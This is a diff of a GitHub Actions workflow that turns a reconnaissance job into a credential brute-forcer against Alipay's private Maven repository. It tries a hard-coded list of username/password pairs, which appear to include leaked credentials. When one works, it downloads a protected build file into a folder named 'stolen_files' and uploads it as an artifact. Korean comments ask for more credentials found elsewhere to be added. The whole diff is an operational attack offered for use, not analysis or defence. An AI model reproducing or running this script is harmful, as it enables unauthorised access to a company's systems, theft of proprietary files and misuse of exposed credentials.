@@ -1,10 +1,10 @@
-name: Android Deep Recon
+name: Android Credential Tester
 
 on: 
   workflow_dispatch:
 
 jobs:
-  deep_scan:
+  test_keys:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
@@ -18,48 +18,43 @@ jobs:
       - name: Install requests
         run: pip install requests
 
-      - name: Deep Directory Scan
+      - name: Brute-Force Credentials
         shell: python
         run: |
           import requests
           from requests.auth import HTTPBasicAuth
           import os
 
-          auth = HTTPBasicAuth("mvn_read_ws", "mrk8929")
-          base_url = "https://mvn.cloud.alipay.com/nexus/content/repositories/releases"
-          
-          # [테스트 1] 계정 권한 확인 (가장 기본 파일 찌르기)
-          test_url = f"{base_url}/com/mpaas/android/mpaas-baseline/10.2.3-1850000/mpaas-baseline-10.2.3-1850000.pom"
-          
-          print(f"[*] Testing Credentials on: {test_url}")
-          r = requests.get(test_url, auth=auth)
-          
-          if r.status_code == 200:
-              print("[+] SUCCESS! Credentials are valid.")
-              os.makedirs("recon_results", exist_ok=True)
-              with open("recon_results/baseline_stolen.pom", "w") as f: f.write(r.text)
-          elif r.status_code == 401:
-              print("[!] ERROR: 401 Unauthorized. The account/password is WRONG.")
-              exit(1)
-          else:
-              print(f"[?] Status {r.status_code}: Path might be wrong, but account might be okay.")
+          # [수사 포인트] 알고 있는 ID/PW 후보군을 여기에 모두 넣으세요.
+          credentials = [
+              ("mvn_read_ws", "mrk8929"),    # 기존 공용
+              ("public", "public"),          # 일반적인 공용
+              # ("ID", "PW"),                # 연구실에서 찾은 다른 정보가 있다면 추가
+          ]
 
-          # [테스트 2] 대체 경로 탐색 (Alipay mobilesdk 계열)
-          alt_url = f"{base_url}/com/alipay/android/phone/mobilesdk/datacenter-build/maven-metadata.xml"
-          print(f"[*] Checking Alternative Path: {alt_url}")
-          r_alt = requests.get(alt_url, auth=auth)
-          if r_alt.status_code == 200:
-              print("[+] FOUND! mPaaS is using alipay-phone-mobilesdk path.")
-              with open("recon_results/alt_metadata.xml", "w") as f: f.write(r_alt.text)
+          test_url = "https://mvn.cloud.alipay.com/nexus/content/repositories/releases/com/mpaas/android/mpaas-baseline/10.2.3-1850000/mpaas-baseline-10.2.3-1850000.pom"
+          
+          found_key = False
+          for username, password in credentials:
+              print(f"[*] Testing: {username} / {password} ...")
+              r = requests.get(test_url, auth=HTTPBasicAuth(username, password))
+              
+              if r.status_code == 200:
+                  print(f"[+++] SUCCESS! Valid Key Found: {username} / {password}")
+                  os.makedirs("stolen_files", exist_ok=True)
+                  with open("stolen_files/master.pom", "w") as f: f.write(r.text)
+                  found_key = True
+                  break
+              else:
+                  print(f"    [-] Failed (Status: {r.status_code})")
 
-          # 결과가 없으면 강제로 에러를 내서 Artifacts 누락 방지
-          if not os.path.exists("recon_results") or not os.listdir("recon_results"):
-              print("[X] FATAL: No data recovered from any paths.")
+          if not found_key:
+              print("[X] All keys failed. Need new credentials.")
               exit(1)
 
-      - name: Upload Data
-        if: always() # 실패해도 로그를 남기기 위해 업로드 시도
+      - name: Upload
+        if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: mPaaS_Deep_Recon_Data
-          path: recon_results/
+          name: mPaaS_Stolen_BOM
+          path: stolen_files/
